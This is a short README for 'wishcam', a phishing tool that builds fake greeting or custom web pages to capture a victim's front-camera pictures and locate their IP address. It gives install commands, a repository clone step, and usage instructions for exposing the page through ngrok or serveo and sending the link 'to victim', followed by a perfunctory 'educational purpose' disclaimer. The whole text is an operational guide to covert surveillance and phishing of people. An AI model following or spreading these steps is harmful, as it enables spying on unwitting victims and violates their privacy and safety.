# wishcam
Using wishcam tool you can generate different phishing links of wishing or custom sites which can grab victim front camera pictures and also gives you lockup information of target IP address.

# Installation

$ apt install php

$ apt install wget

$ apt install openssh

$ git clone https://github.com/prahlad01/wishcam

# Usage

$ cd wishcam

# Now turn your device hotspot

$ bash wishcam.sh

Sometimes servero server is down so always go with ngrok for instant link and wait until it generates url for then send it to victim.

# Note :- If victim open this url in chrome or android inbuilt browser then it can access victim camera by allowing permissions and send snap to you.
This information is only for educationla purpose and we are not responsible for any kind of illegal activity done by this tool.
